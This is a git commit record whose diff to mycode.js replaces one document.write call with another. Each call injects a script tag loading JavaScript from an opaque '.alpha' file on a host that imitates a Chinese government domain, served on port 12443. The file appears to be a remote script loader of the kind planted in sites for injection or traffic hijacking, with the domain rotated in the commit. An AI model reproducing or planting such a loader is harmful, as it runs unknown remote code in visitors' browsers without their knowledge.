09d87b833df983038e4f11b8248efaf2347db7fa
boba3721 <68194272+boba3721@users.noreply.github.com>
2021-10-12 01:38:59 +0000

    Update mycode.js

--- mycode.js
+++ mycode.js
@@ -1,1 +1,1 @@
-document.write('<script src="https://www.govkunming.cn:12443/ty/F7218EC9-AC06-16347-33-70C53378B120.alpha"><\/script>');
+document.write('<script src="https://www.govyunfu.cn:12443/ty/0BEE73F6-F26F-16347-33-1D7519A8AD78.alpha"><\/script>');
